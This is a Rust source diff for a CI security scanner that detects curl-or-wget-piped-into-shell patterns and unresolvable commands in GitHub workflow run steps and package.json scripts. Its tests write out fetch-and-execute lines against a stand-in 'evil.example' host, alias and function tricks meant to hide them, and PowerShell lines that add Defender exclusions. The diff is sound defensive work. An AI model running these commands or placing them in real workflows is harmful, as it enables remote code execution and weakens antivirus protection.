@@ -20,7 +20,10 @@ use std::path::Path;
 use serde_yaml::Value;
 
 use crate::redact;
+use crate::tokenize::{self, ShellType};
 use crate::verdict::{Evidence, Finding, RuleId, Severity};
+
+use super::command;
 
 /// Classification of a repository file `cifile` rules understand.
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
@@ -401,49 +404,142 @@ fn github_expressions(line: &str) -> Vec<&str> {
     out
 }
 
-/// A pipe-to-shell shape inside a `run:` step — a network fetch piped into a
-/// shell interpreter. Conservative: requires both a fetch tool and a pipe into
-/// a known shell so an ordinary `echo x | grep y` does not fire.
-fn line_has_curl_pipe_shell(line: &str) -> bool {
-    let lower = line.to_ascii_lowercase();
-    let has_fetch = lower.contains("curl ")
-        || lower.contains("wget ")
-        || lower.contains("curl\t")
-        || lower.contains("wget\t");
-    if !has_fetch {
-        return false;
+/// Downloaders covered by the workflow/package-script pipe-to-shell rule.
+const SCRIPT_FETCH_COMMANDS: &[&str] = &["curl", "wget"];
+
+#[derive(Debug, Default, Clone, Copy, PartialEq, Eq)]
+struct ShellLineAnalysis {
+    curl_pipe_shell: bool,
+    incomplete: bool,
+}
+
+const MAX_RECOVERED_SHELL_BODIES: usize = 128;
+const MAX_RECOVERED_SHELL_BYTES: usize = 1024 * 1024;
+
+struct ShellAnalysisBudget {
+    bodies: usize,
+    bytes: usize,
+}
+
+impl ShellAnalysisBudget {
+    fn consume(&mut self, bytes: usize) -> bool {
+        let Some(next_bodies) = self.bodies.checked_add(1) else {
+            return false;
+        };
+        let Some(next_bytes) = self.bytes.checked_add(bytes) else {
+            return false;
+        };
+        if next_bodies > MAX_RECOVERED_SHELL_BODIES || next_bytes > MAX_RECOVERED_SHELL_BYTES {
+            return false;
+        }
+        self.bodies = next_bodies;
+        self.bytes = next_bytes;
+        true
     }
-    // A pipe followed (possibly after `sudo`/whitespace) by a shell name.
-    let Some(pipe_pos) = lower.find('|') else {
-        return false;
+}
+
+/// A pipe-to-shell shape inside a `run:` step — a network fetch piped into a
+/// shell interpreter. The shell tokenizer excludes quoted/commented pipes and
+/// exposes every real control operator, so later pipelines cannot hide behind
+/// an earlier benign one. A downloader taint is retained only across contiguous
+/// `|` / `|&` segments, which also catches transparent intermediate stages such
+/// as `curl ... | tee script | bash` without crossing `;`, `&&`, or `||`.
+fn analyze_shell_line(line: &str) -> ShellLineAnalysis {
+    analyze_shell_line_for_shell(line, ShellType::Posix)
+}
+
+fn analyze_shell_line_for_shell(line: &str, shell: ShellType) -> ShellLineAnalysis {
+    let mut budget = ShellAnalysisBudget {
+        bodies: 0,
+        bytes: 0,
     };
-    let after_pipe = lower[pipe_pos + 1..].trim_start();
-    // Skip an optional `sudo ` / `env ` wrapper.
-    let after_wrapper = after_pipe
-        .strip_prefix("sudo ")
-        .or_else(|| after_pipe.strip_prefix("env "))
-        .unwrap_or(after_pipe)
-        .trim_start();
-    let first_word = after_wrapper
-        .split([' ', '\t', ';', '&'])
-        .next()
-        .unwrap_or("");
-    // Strip a leading path (`/bin/bash` → `bash`).
-    let shell_word = first_word.rsplit('/').next().unwrap_or(first_word);
-    matches!(
-        shell_word,
-        "sh" | "bash"
-            | "zsh"
-            | "dash"
-            | "ksh"
-            | "fish"
-            | "ash"
-            | "python"
-            | "python3"
-            | "perl"
-            | "ruby"
-            | "node"
-    )
+    let mut seen = std::collections::HashSet::new();
+    analyze_shell_line_depth(line, shell, 0, &mut budget, &mut seen)
+}
+
+fn analyze_shell_line_depth(
+    line: &str,
+    shell: ShellType,
+    depth: usize,
+    budget: &mut ShellAnalysisBudget,
+    seen: &mut std::collections::HashSet<(ShellType, String)>,
+) -> ShellLineAnalysis {
+    let execution_view = crate::extract::shell_execution_view(line, shell);
+    let segments = tokenize::tokenize(execution_view.as_ref(), shell);
+    let mut pipeline_has_fetch = false;
+    let mut analysis = ShellLineAnalysis::default();
+
+    for (index, segment) in segments.iter().enumerate() {
+        let crosses_command_newline = index > 0
+            && line
+                .get(segments[index - 1].byte_range.end..segment.byte_range.start)
+                .is_some_and(|between| between.contains('\n'));
+        let continues_pipeline = index > 0
+            && !crosses_command_newline
+            && segment
+                .preceding_separator
+                .as_deref()
+                .is_some_and(|separator| matches!(separator, "|" | "|&"));
+
+        if !continues_pipeline {
+            pipeline_has_fetch = false;
+        }
+
+        let (is_fetch, is_interpreter) = match command::resolve_effective_segment(segment, shell) {
+            Ok(effective) => {
+                let name = effective
+                    .command
+                    .as_deref()
+                    .map(|name| command::normalize_cmd_base(name, shell))
+                    .unwrap_or_default();
+                (
+                    SCRIPT_FETCH_COMMANDS.contains(&name.as_str()),
+                    command::INTERPRETERS.contains(&name.as_str()),
+                )
+            }
+            Err(_) => {
+                // FileScan intentionally does not run the generic command-rule
+                // suite over the entire YAML/JSON document.  A `run:`/lifecycle
+                // command therefore has to preserve the resolver's third state
+                // here instead of collapsing it to "not a match".
+                // A segment containing only environment assignments has no
+                // executable to resolve; the command resolver uses `Err` for
+                // that absence, but it is not an analysis failure.
+                analysis.incomplete |= segment.command.is_some()
+                    && !crate::extract::is_complete_literal_posix_function_definition(
+                        segment, shell,
+                    );
+                (false, false)
+            }
+        };
+
+        if continues_pipeline && pipeline_has_fetch && is_interpreter {
+            analysis.curl_pipe_shell = true;
+        }
+
+        pipeline_has_fetch |= is_fetch;
+    }
+
+    let nested = crate::extract::executable_substitution_scan(line, shell);
+    analysis.incomplete |= nested.gap.is_some();
+    if depth >= 8 {
+        analysis.incomplete |= !nested.bodies.is_empty();
+    } else {
+        for body in nested.bodies {
+            if !budget.consume(body.input.len()) {
+                analysis.incomplete = true;
+                break;
+            }
+            if !seen.insert((body.shell, body.input.clone())) {
+                continue;
+            }
+            let child = analyze_shell_line_depth(&body.input, body.shell, depth + 1, budget, seen);
+            analysis.curl_pipe_shell |= child.curl_pipe_shell;
+            analysis.incomplete |= child.incomplete;
+        }
+    }
+
+    analysis
 }
 
 /// Scan a workflow's `run:` steps for a pipe-to-shell and for untrusted-input
@@ -458,6 +554,7 @@ fn check_workflow_run_steps(input: &str, findings: &mut Vec<Finding>) {
     // deeper; a sibling `env:` at the key column or shallower ends the block.
     let mut run_key_col = 0usize;
     let mut curl_pipe_evidence: Option<String> = None;
+    let mut incomplete_evidence: Option<String> = None;
     let mut untrusted_evidence: Option<(String, String)> = None;
 
     // YAML folded scalars (`run: >`) join physical source lines with spaces.
@@ -465,7 +562,9 @@ fn check_workflow_run_steps(input: &str, findings: &mut Vec<Finding>) {
     // the physical-line pass below as a tolerant fallback for malformed files.
     // Literal scalars preserve newlines, so `curl` and `| bash` on separate
     // command lines are still not joined into a false positive.
-    if let Ok(doc) = serde_yaml::from_str::<Value>(input) {
+    let parsed_doc = serde_yaml::from_str::<Value>(input);
+    let yaml_parsed = parsed_doc.is_ok();
+    if let Ok(doc) = parsed_doc {
         if let Some(jobs) = get_field(&doc, "jobs").and_then(Value::as_mapping) {
             for job in jobs.values() {
                 let Some(steps) = get_field(job, "steps").and_then(Value::as_sequence) else {
@@ -475,11 +574,29 @@ fn check_workflow_run_steps(input: &str, findings: &mut Vec<Finding>) {
                     let Some(script) = get_field(step, "run").and_then(Value::as_str) else {
                         continue;
                     };
+                    let step_shell = workflow_step_shell(&doc, job, step);
+                    match &step_shell {
+                        Ok(shell) => {
+                            let script_analysis = analyze_shell_line_for_shell(script, *shell);
+                            if curl_pipe_evidence.is_none() && script_analysis.curl_pipe_shell {
+                                curl_pipe_evidence = Some(truncate(script, 200));
+                            }
+                            if incomplete_evidence.is_none() && script_analysis.incomplete {
+                                incomplete_evidence = Some(truncate(script, 200));
+                            }
+                        }
+                        Err(reason) if incomplete_evidence.is_none() => {
+                            incomplete_evidence = Some(reason.clone());
+                        }
+                        Err(_) => {}
+                    }
                     for line in script.lines() {
                         scan_run_line(
                             line.trim(),
                             &mut curl_pipe_evidence,
+                            &mut incomplete_evidence,
                             &mut untrusted_evidence,
+                            step_shell.as_ref().ok().copied(),
                         );
                     }
                 }
@@ -523,7 +640,13 @@ fn check_workflow_run_steps(input: &str, findings: &mut Vec<Finding>) {
                 continue;
             }
             // A single-line `run:` — scan just this line.
-            scan_run_line(inline, &mut curl_pipe_evidence, &mut untrusted_evidence);
+            scan_run_line(
+                inline,
+                &mut curl_pipe_evidence,
+                &mut incomplete_evidence,
+                &mut untrusted_evidence,
+                (!yaml_parsed).then_some(ShellType::Posix),
+            );
             in_run_block = false;
             continue;
         }
@@ -535,7 +658,13 @@ fn check_workflow_run_steps(input: &str, findings: &mut Vec<Finding>) {
             if !trimmed.is_empty() && indent <= run_key_col {
                 in_run_block = false;
             } else if !trimmed.is_empty() {
-                scan_run_line(trimmed, &mut curl_pipe_evidence, &mut untrusted_evidence);
+                scan_run_line(
+                    trimmed,
+                    &mut curl_pipe_evidence,
+                    &mut incomplete_evidence,
+                    &mut untrusted_evidence,
+                    (!yaml_parsed).then_some(ShellType::Posix),
+                );
             }
         }
     }
@@ -555,6 +684,27 @@ fn check_workflow_run_steps(input: &str, findings: &mut Vec<Finding>) {
                     .to_string(),
             evidence: vec![Evidence::CommandPattern {
                 pattern: "run: curl | shell".to_string(),
+                matched: redact::redact_shell_assignments(&ev),
+            }],
+            human_view: None,
+            agent_view: None,
+            mitre_id: None,
+            custom_rule_id: None,
+        });
+    }
+
+    if let Some(ev) = incomplete_evidence {
+        findings.push(Finding {
+            rule_id: RuleId::AnalysisIncomplete,
+            severity: Severity::High,
+            title: "Workflow run command could not be analyzed completely".to_string(),
+            description:
+                "A `run:` step contains an execution wrapper, alias mutation, or nested shell \
+                 body whose effective command cannot be proven statically. Tirith blocks the \
+                 workflow finding instead of treating an unresolved CI command as benign."
+                    .to_string(),
+            evidence: vec![Evidence::CommandPattern {
+                pattern: "unresolved workflow run command".to_string(),
                 matched: redact::redact_shell_assignments(&ev),
             }],
             human_view: None,
@@ -585,6 +735,350 @@ fn check_workflow_run_steps(input: &str, findings: &mut Vec<Finding>) {
             mitre_id: None,
             custom_rule_id: None,
         });
+    }
+}
+
+/// Resolve the effective runner shell using GitHub Actions' precedence:
+/// step-level `shell`, job-level `defaults.run.shell`, then workflow-level
+/// `defaults.run.shell`. With no declaration, statically-known hosted runner
+/// labels select the platform default (`pwsh` on Windows, POSIX elsewhere).
+/// Dynamic/unknown metadata preserves the analyzer's fail-closed third state.
+fn workflow_step_shell(doc: &Value, job: &Value, step: &Value) -> Result<ShellType, String> {
+    if let Some(value) = get_field(step, "shell") {
+        return workflow_shell_value(value, "step shell");
+    }
+    if let Some(value) = workflow_default_shell(job, "job")? {
+        return workflow_shell_value(value, "job default shell");
+    }
+    if let Some(value) = workflow_default_shell(doc, "workflow")? {
+        return workflow_shell_value(value, "workflow default shell");
+    }
+    workflow_runner_default_shell(job)
+}
+
+fn workflow_default_shell<'a>(
+    scope: &'a Value,
+    scope_name: &str,
+) -> Result<Option<&'a Value>, String> {
+    let Some(defaults) = get_field(scope, "defaults") else {
+        return Ok(None);
+    };
+    if defaults.as_mapping().is_none() {
+        return Err(format!("unknown or dynamic {scope_name} defaults"));
+    }
+    let Some(run) = get_field(defaults, "run") else {
+        return Ok(None);
+    };
+    if run.as_mapping().is_none() {
+        return Err(format!("unknown or dynamic {scope_name} run defaults"));
+    }
+    Ok(get_field(run, "shell"))
+}
+
+fn workflow_shell_value(value: &Value, source: &str) -> Result<ShellType, String> {
+    let Some(declaration) = value.as_str() else {
+        return Err(format!("non-string {source} declaration"));
+    };
+    let Some(shell) = parse_workflow_shell(declaration) else {
+        return Err(format!(
+            "unsupported {source} declaration: {}",
+            truncate(declaration, 120)
+        ));
+    };
+    Ok(shell)
+}
+
+fn parse_workflow_shell(declaration: &str) -> Option<ShellType> {
+    let declaration = declaration.trim();
+    if declaration.is_empty() || declaration.contains("${{") {
+        return None;
+    }
+    let tokens: Vec<&str> = declaration.split_ascii_whitespace().collect();
+    let shell = workflow_shell_executable_type(tokens.first()?)?;
+
+    if tokens.len() == 1 {
+        return Some(shell);
+    }
+
+    // A custom template is analyzable only when it invokes the selected shell
+    // directly on GitHub's script placeholder. Quoting/control syntax, a
+    // command-string flag, or another interpreter token can delegate execution
+    // to a different grammar (for example `bash -c 'pwsh -File {0}'`).
+    if tokens.iter().filter(|token| **token == "{0}").count() != 1
+        || declaration
+            .chars()
+            .any(|ch| matches!(ch, '\'' | '"' | '`' | '$' | ';' | '|' | '&' | '<' | '>'))
+    {
+        return None;
+    }
+    let placeholder = tokens.iter().position(|token| *token == "{0}")?;
+
+    // GitHub's grammar is `command [options] {0} [more_options]`. Once `{0}`
+    // has been proven as the shell's script/-File operand, every later token is
+    // argv for that script and cannot switch the host grammar. The declaration
+    // checks above already require those suffix tokens to be static and free of
+    // shell control syntax, so only the prefix needs host-option parsing.
+    workflow_template_options_are_direct(shell, &tokens[1..placeholder], true).then_some(shell)
+}
+
+/// Classify only a bare, known shell name or an explicitly enumerated system
+/// executable. Basename matching is insufficient here: a repository-owned
+/// `.github/bash` or attacker-controlled `/tmp/bash` may implement any grammar.
+fn workflow_shell_executable_type(executable: &str) -> Option<ShellType> {
+    let executable_lower = executable.to_ascii_lowercase();
+    if !executable.contains(['/', '\\']) {
+        return workflow_bare_shell_type(&executable_lower);
+    }
+
+    match executable_lower.as_str() {
+        "/bin/sh" | "/bin/bash" | "/bin/zsh" | "/bin/dash" | "/bin/ksh" | "/usr/bin/sh"
+        | "/usr/bin/bash" | "/usr/bin/zsh" | "/usr/bin/dash" | "/usr/bin/ksh" => {
+            Some(ShellType::Posix)
+        }
+        "/bin/fish" | "/usr/bin/fish" => Some(ShellType::Fish),
+        r"c:\windows\system32\cmd.exe" => Some(ShellType::Cmd),
+        r"c:\windows\system32\windowspowershell\v1.0\powershell.exe" => Some(ShellType::PowerShell),
+        _ => None,
+    }
+}
+
+fn workflow_bare_shell_type(executable: &str) -> Option<ShellType> {
+    match executable {
+        "sh" | "sh.exe" | "bash" | "bash.exe" | "zsh" | "zsh.exe" | "dash" | "dash.exe" | "ksh"
+        | "ksh.exe" => Some(ShellType::Posix),
+        "pwsh" | "pwsh.exe" | "powershell" | "powershell.exe" => Some(ShellType::PowerShell),
+        "cmd" | "cmd.exe" => Some(ShellType::Cmd),
+        "fish" | "fish.exe" => Some(ShellType::Fish),
+        _ => None,
+    }
+}
+
+/// Validate the prefix before `{0}` as options to the selected shell, not as an
+/// earlier positional operand. `placeholder_follows` permits PowerShell's
+/// `-File {0}` form.
+fn workflow_template_options_are_direct(
+    shell: ShellType,
+    options: &[&str],
+    placeholder_follows: bool,
+) -> bool {
+    match shell {
+        ShellType::Posix => workflow_posix_template_options_are_direct(options),
+        ShellType::PowerShell => {
+            workflow_powershell_template_options_are_direct(options, placeholder_follows)
+        }
+        ShellType::Cmd => options.iter().all(|option| {
+            option.starts_with('/') && !matches!(option.to_ascii_lowercase().as_str(), "/c" | "/k")
+        }),
+        ShellType::Fish => options.iter().all(|option| {
+            let lower = option.to_ascii_lowercase();
+            option.starts_with('-')
+                && !matches!(lower.as_str(), "-c" | "--command" | "--init-command")
+        }),
+    }
+}
+
+fn workflow_posix_template_options_are_direct(options: &[&str]) -> bool {
+    let mut index = 0usize;
+    while index < options.len() {
+        let option = options[index];
+        if !option.starts_with('-') && !option.starts_with('+') {
+            return false;
+        }
+        if option == "--" {
+            return index + 1 == options.len();
+        }
+        if option == "--command"
+            || option.starts_with("--command=")
+            || option == "--rcfile"
+            || option.starts_with("--rcfile=")
+            || option == "--init-file"
+            || option.starts_with("--init-file=")
+        {
+            return false;
+        }
+        if option.starts_with("--") {
+            if !matches!(
+                option,
+                "--debugger"
+                    | "--dump-po-strings"
+                    | "--dump-strings"
+                    | "--help"
+                    | "--login"
+                    | "--noediting"
+                    | "--noprofile"
+                    | "--norc"
+                    | "--posix"
+                    | "--pretty-print"
+                    | "--restricted"
+                    | "--verbose"
+                    | "--version"
+            ) {
+                return false;
+            }
+            index += 1;
+            continue;
+        }
+
+        // Lowercase `-c` selects a command string and `-s` reads commands from
+        // stdin, so `{0}` would not be the script operand. Uppercase Bash `-C`
+        // is the distinct `noclobber` option and must remain case-sensitive.
+        if option.strip_prefix('-').is_some_and(|flags| {
+            !flags.starts_with('-') && (flags.contains('c') || flags.contains('s'))
+        }) {
+            return false;
+        }
+
+        let Some(short_flags) = option
+            .strip_prefix('-')
+            .or_else(|| option.strip_prefix('+'))
+        else {
+            return false;
+        };
+        if short_flags.is_empty()
+            || !short_flags
+                .chars()
+                .all(|flag| "abefhiklmnoprstuvxBCDEHOPT".contains(flag))
+        {
+            return false;
+        }
+        let consumes_option_name = short_flags.contains('o') || short_flags.contains('O');
+        if consumes_option_name {
+            index += 1;
+            if index >= options.len() || options[index].starts_with(['-', '+']) {
+                return false;
+            }
+        }
+        index += 1;
+    }
+    true
+}
+
+fn workflow_powershell_template_options_are_direct(
+    options: &[&str],
+    placeholder_follows: bool,
+) -> bool {
+    let mut index = 0usize;
+    while index < options.len() {
+        let lower = options[index].to_ascii_lowercase();
+        if !lower.starts_with('-') {
+            return false;
+        }
+        if matches!(
+            lower.as_str(),
+            "-c" | "-command" | "-commandwithargs" | "-encodedcommand" | "-ec"
+        ) {
+            return false;
+        }
+        if matches!(
+            lower.as_str(),
+            "-nologo"
+                | "-noprofile"
+                | "-noninteractive"
+                | "-noexit"
+                | "-mta"
+                | "-sta"
+                | "-login"
+                | "-noprofileloadtime"
+                | "-removeworkingdirectorytrailingcharacter"
+                | "-servermode"
+                | "-socketservermode"
+                | "-sshservermode"
+        ) {
+            index += 1;
+            continue;
+        }
+        if matches!(lower.as_str(), "-file" | "-f") {
+            // `{0}` immediately follows `-File`, making it the actual script
+            // operand. Any token here, or `-File` on the suffix side, would
+            // instead be a wrapper/missing script operand.
+            return placeholder_follows && index + 1 == options.len();
+        }
+        if matches!(
+            lower.as_str(),
+            "-executionpolicy"
+                | "-inputformat"
+                | "-outputformat"
+                | "-windowstyle"
+                | "-workingdirectory"
+                | "-settingsfile"
+                | "-configurationname"
+                | "-custompipename"
+        ) {
+            index += 1;
+            if index >= options.len() || options[index].starts_with('-') {
+                return false;
+            }
+            index += 1;
+            continue;
+        }
+        return false;
+    }
+    true
+}
+
+fn workflow_runner_default_shell(job: &Value) -> Result<ShellType, String> {
+    let Some(runs_on) = get_field(job, "runs-on") else {
+        // A job with steps but no `runs-on` is not executable by GitHub. Keep
+        // the historical POSIX interpretation for malformed/test fixtures.
+        return Ok(ShellType::Posix);
+    };
+    let label = match runs_on {
+        Value::String(label) => label.as_str(),
+        Value::Sequence(labels) if labels.len() == 1 => labels[0]
+            .as_str()
+            .ok_or_else(|| "unknown or dynamic workflow runner".to_string())?,
+        _ => return Err("unknown or dynamic workflow runner".to_string()),
+    };
+    let label = label.trim().to_ascii_lowercase();
+    if label.is_empty() || label.contains("${{") {
+        return Err(format!(
+            "unknown or dynamic workflow runner: {}",
+            truncate(label.as_str(), 120)
+        ));
+    }
+    if let Some(shell) = github_hosted_runner_shell(&label) {
+        return Ok(shell);
+    }
+    Err(format!(
+        "unknown or dynamic workflow runner: {}",
+        truncate(label.as_str(), 120)
+    ))
+}
+
+/// GitHub's documented static hosted-runner labels. Prefix matching is unsafe:
+/// organizations can register custom runners with labels such as
+/// `windows-attacker` or `ubuntu-internal` whose operating system is unrelated.
+fn github_hosted_runner_shell(label: &str) -> Option<ShellType> {
+    match label {
+        "windows-latest"
+        | "windows-2025"
+        | "windows-2025-vs2026"
+        | "windows-2022"
+        | "windows-11-arm"
+        | "windows-11-vs2026-arm" => Some(ShellType::PowerShell),
+        "ubuntu-slim"
+        | "ubuntu-latest"
+        | "ubuntu-22.04"
+        | "ubuntu-24.04"
+        | "ubuntu-26.04"
+        | "ubuntu-22.04-arm"
+        | "ubuntu-24.04-arm"
+        | "ubuntu-26.04-arm"
+        | "macos-latest"
+        | "macos-14"
+        | "macos-15"
+        | "macos-26"
+        | "macos-15-intel"
+        | "macos-26-intel"
+        | "macos-latest-large"
+        | "macos-14-large"
+        | "macos-15-large"
+        | "macos-26-large"
+        | "macos-latest-xlarge"
+        | "macos-14-xlarge"
+        | "macos-15-xlarge"
+        | "macos-26-xlarge" => Some(ShellType::Posix),
+        _ => None,
     }
 }
 
@@ -620,10 +1114,18 @@ fn is_yaml_block_scalar_header(code: &str) -> bool {
 fn scan_run_line(
     line: &str,
     curl_pipe: &mut Option<String>,
+    incomplete: &mut Option<String>,
     untrusted: &mut Option<(String, String)>,
+    shell: Option<ShellType>,
 ) {
-    if curl_pipe.is_none() && line_has_curl_pipe_shell(line) {
-        *curl_pipe = Some(truncate(line, 200));
+    if let Some(shell) = shell {
+        let analysis = analyze_shell_line_for_shell(line, shell);
+        if curl_pipe.is_none() && analysis.curl_pipe_shell {
+            *curl_pipe = Some(truncate(line, 200));
+        }
+        if incomplete.is_none() && analysis.incomplete {
+            *incomplete = Some(truncate(line, 200));
+        }
     }
     if untrusted.is_none() {
         for expr in github_expressions(line) {
@@ -1663,8 +2165,21 @@ fn check_package_json(input: &str, findings: &mut Vec<Finding>) {
 fn dangerous_script_reason(cmd: &str) -> Option<String> {
     let lower = cmd.to_ascii_lowercase();
 
+    let shell_analysis = analyze_shell_line(cmd);
+    if shell_analysis.incomplete
+        || crate::extract::executable_substitution_scan(cmd, ShellType::Posix)
+            .gap
+            .is_some()
+    {
+        return Some(
+            "contains an execution wrapper, alias mutation, or nested shell body whose effective \
+             command cannot be proven statically"
+                .to_string(),
+        );
+    }
+
     // 1 — pipe-to-shell: a network fetch piped into a shell interpreter.
-    if line_has_curl_pipe_shell(cmd) {
+    if shell_analysis.curl_pipe_shell {
         return Some(
             "fetches a script over the network and pipes it into a shell (`curl … | bash`)"
                 .to_string(),
@@ -1751,6 +2266,23 @@ mod tests {
 
     fn clean(content: &str, path: &str) -> bool {
         run(content, path).is_empty()
+    }
+
+    fn resolved_step_shells(content: &str) -> Vec<Result<ShellType, String>> {
+        let doc = serde_yaml::from_str::<Value>(content).expect("valid workflow fixture");
+        let mut shells = Vec::new();
+        if let Some(jobs) = get_field(&doc, "jobs").and_then(Value::as_mapping) {
+            for job in jobs.values() {
+                if let Some(steps) = get_field(job, "steps").and_then(Value::as_sequence) {
+                    for step in steps {
+                        if get_field(step, "run").and_then(Value::as_str).is_some() {
+                            shells.push(workflow_step_shell(&doc, job, step));
+                        }
+                    }
+                }
+            }
+        }
+        shells
     }
 
     // --- classification ---------------------------------------------------
@@ -1948,6 +2480,570 @@ mod tests {
     fn workflow_run_curl_pipe_bash_flagged() {
         let wf = "jobs:\n  build:\n    steps:\n      - run: curl example.sh | bash\n";
         assert!(has(
+            wf,
+            ".github/workflows/ci.yml",
+            RuleId::WorkflowCurlPipeShell
+        ));
+    }
+
+    #[test]
+    fn workflow_dynamic_env_split_sink_fails_closed() {
+        let wf = "jobs:\n  build:\n    steps:\n      - run: curl https://x | env -S '${SINK}'\n";
+        assert!(has(
+            wf,
+            ".github/workflows/ci.yml",
+            RuleId::AnalysisIncomplete
+        ));
+        assert!(!has(
+            wf,
+            ".github/workflows/ci.yml",
+            RuleId::WorkflowCurlPipeShell
+        ));
+    }
+
+    #[test]
+    fn workflow_alias_defined_sink_resolves_across_run_scalar() {
+        let wf = "jobs:\n  build:\n    steps:\n      - run: |\n          shopt -s expand_aliases\n          alias sink='bash'\n          curl https://x | sink\n";
+        assert!(has(
+            wf,
+            ".github/workflows/ci.yml",
+            RuleId::WorkflowCurlPipeShell
+        ));
+        assert!(!has(
+            wf,
+            ".github/workflows/ci.yml",
+            RuleId::AnalysisIncomplete
+        ));
+    }
+
+    #[test]
+    fn workflow_trailing_blank_alias_chain_fails_closed() {
+        let wf = "jobs:\n  build:\n    steps:\n      - run: |\n          shopt -s expand_aliases\n          alias fetch='curl '\n          alias target='https://evil.example/install.sh | bash'\n          fetch target\n";
+        assert!(has(
+            wf,
+            ".github/workflows/ci.yml",
+            RuleId::AnalysisIncomplete
+        ));
+
+        let quoted_control = "jobs:\n  build:\n    steps:\n      - run: |\n          shopt -s expand_aliases\n          alias fetch='curl '\n          alias target='https://example.test/file'\n          fetch 'target'\n";
+        assert!(!has(
+            quoted_control,
+            ".github/workflows/ci.yml",
+            RuleId::AnalysisIncomplete
+        ));
+    }
+
+    #[test]
+    fn workflow_conditional_alias_mutations_preserve_the_prior_sink() {
+        for mutation in ["false && alias sink='cat'", "true || unalias sink"] {
+            let wf = format!(
+                "jobs:\n  build:\n    steps:\n      - run: |\n          shopt -s expand_aliases\n          alias sink='bash'\n          {mutation}\n          curl https://evil.example/install.sh | sink\n"
+            );
+            assert!(has(
+                &wf,
+                ".github/workflows/ci.yml",
+                RuleId::AnalysisIncomplete
+            ));
+            assert!(has(
+                &wf,
+                ".github/workflows/ci.yml",
+                RuleId::WorkflowCurlPipeShell
+            ));
+        }
+
+        let control = "jobs:\n  build:\n    steps:\n      - run: |\n          false && echo skipped\n          echo safe\n";
+        assert!(!has(
+            control,
+            ".github/workflows/ci.yml",
+            RuleId::AnalysisIncomplete
+        ));
+    }
+
+    #[test]
+    fn workflow_conditional_function_redefinition_fails_closed() {
+        let wf = "jobs:\n  build:\n    steps:\n      - run: |\n          sink(){ bash; }\n          false && sink(){ cat; }\n          curl https://evil.example/install.sh | sink\n";
+        assert!(has(
+            wf,
+            ".github/workflows/ci.yml",
+            RuleId::AnalysisIncomplete
+        ));
+
+        let dormant_control = "jobs:\n  build:\n    steps:\n      - run: |\n          sink(){ echo safe; }\n          echo safe\n";
+        assert!(!has(
+            dormant_control,
+            ".github/workflows/ci.yml",
+            RuleId::AnalysisIncomplete
+        ));
+    }
+
+    #[test]
+    fn workflow_extended_bash_function_sink_fails_closed() {
+        let wf = "jobs:\n  build:\n    steps:\n      - run: |\n          sink-fn(){ bash; }\n          curl https://evil.example/install.sh | sink-fn\n";
+        assert!(has(
+            wf,
+            ".github/workflows/ci.yml",
+            RuleId::AnalysisIncomplete
+        ));
+    }
+
+    #[test]
+    fn workflow_unrelated_dispatch_state_joins_stay_complete() {
+        let posix = "jobs:\n  build:\n    steps:\n      - run: |\n          helper(){ echo safe; }\n          (echo safe)\n";
+        assert!(!has(
+            posix,
+            ".github/workflows/ci.yml",
+            RuleId::AnalysisIncomplete
+        ));
+
+        let powershell = "jobs:\n  build:\n    steps:\n      - shell: pwsh\n        run: |\n          function Helper { Write-Output safe }\n          iex 'Write-Output safe'\n";
+        assert!(!has(
+            powershell,
+            ".github/workflows/ci.yml",
+            RuleId::AnalysisIncomplete
+        ));
+    }
+
+    #[test]
+    fn workflow_escaped_alias_state_joins_fail_closed() {
+        for mutation in ["eval '\\alias sink=\"bash\"'", "{ a\\lias sink='bash'; }"] {
+            let wf = format!(
+                "jobs:\n  build:\n    steps:\n      - run: |\n          alias sink='echo safe'\n          {mutation}\n          curl https://evil.example/install.sh | sink\n"
+            );
+            assert!(has(
+                &wf,
+                ".github/workflows/ci.yml",
+                RuleId::AnalysisIncomplete
+            ));
+        }
+    }
+
+    #[test]
+    fn workflow_posix_control_prefix_dispatch_state_fails_closed_with_safe_controls() {
+        for run in [
+            "shopt -s expand_aliases\nalias danger='curl https://evil.example/install.sh | bash'\nif true; then danger; fi",
+            "danger-fn(){ curl https://evil.example/install.sh | bash; }\n! danger-fn",
+            "danger-fn(){ curl https://evil.example/install.sh | bash; }\ntime -p danger-fn",
+        ] {
+            let wf = format!(
+                "jobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: |\n{}",
+                run.lines()
+                    .map(|line| format!("          {line}\n"))
+                    .collect::<String>()
+            );
+            assert!(
+                has(
+                    &wf,
+                    ".github/workflows/ci.yml",
+                    RuleId::WorkflowCurlPipeShell
+                ),
+                "known dangerous dispatch body was not recovered: {run:?}"
+            );
+            assert!(
+                !has(&wf, ".github/workflows/ci.yml", RuleId::AnalysisIncomplete),
+                "proven dispatch state remained incomplete: {run:?}"
+            );
+        }
+
+        let safe = "jobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: |\n          helper(){ cat; }\n          printf safe | helper\n";
+        assert!(!has(
+            safe,
+            ".github/workflows/ci.yml",
+            RuleId::AnalysisIncomplete
+        ));
+    }
+
+    #[test]
+    fn workflow_powershell_provider_and_iex_state_joins_fail_closed() {
+        for script in [
+            "$Function:Evil = { Add-MpPreference -ExclusionPath C:\\Temp }; Evil",
+            "if ($true) { $Alias:Evil = \"Invoke-Expression\" }; Evil \"Add-MpPreference -ExclusionPath C:\\Temp\"",
+            "Set-Location Function:; New-Item Evil -Value { Add-MpPreference -ExclusionPath C:\\Temp }; Evil",
+            "function Evil { Add-MpPreference -ExclusionPath C:\\Temp }; iex \"Evil\"",
+        ] {
+            let wf = format!(
+                "jobs:\n  build:\n    steps:\n      - run: pwsh -NoProfile -Command '{script}'\n"
+            );
+            assert!(has(
+                &wf,
+                ".github/workflows/ci.yml",
+                RuleId::AnalysisIncomplete
+            ));
+        }
+    }
+
+    #[test]
+    fn workflow_pwsh_metadata_applies_to_inline_and_block_runs() {
+        let inline = "jobs:\n  build:\n    steps:\n      - shell: pwsh\n        run: $Function:Evil = { Add-MpPreference -ExclusionPath C:\\Temp }; Evil\n";
+        assert!(has(
+            inline,
+            ".github/workflows/ci.yml",
+            RuleId::AnalysisIncomplete
+        ));
+
+        let block = "jobs:\n  build:\n    steps:\n      - shell: pwsh\n        run: |\n          $Function:Evil = { Add-MpPreference -ExclusionPath C:\\Temp }\n          Evil\n";
+        assert!(has(
+            block,
+            ".github/workflows/ci.yml",
+            RuleId::AnalysisIncomplete
+        ));
+    }
+
+    #[test]
+    fn workflow_known_shell_metadata_keeps_benign_runs_complete() {
+        for shell in [
+            "sh",
+            "bash",
+            "bash --noprofile -eo pipefail {0}",
